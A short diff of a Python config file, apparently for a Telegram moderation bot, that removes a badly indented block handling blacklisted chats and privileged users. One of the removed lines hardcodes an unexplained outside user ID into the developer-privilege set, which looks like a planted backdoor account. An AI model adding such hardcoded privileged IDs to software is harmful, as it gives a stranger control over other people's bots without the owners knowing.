@@ -202,14 +202,6 @@ else:
     LASTFM_API_KEY = Config.LASTFM_API_KEY
 
 DEV_USERS.add(OWNER_ID)
-    try:
-    BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
-   except ValueError:
-    raise Exception("Your blacklisted chats list does not contain valid integers.")
-
-    DRAGONS.add(OWNER_ID)
-    DEV_USERS.add(OWNER_ID)
-    DEV_USERS.add(1665347268)
 
 
 # Pass if SpamWatch token not set.
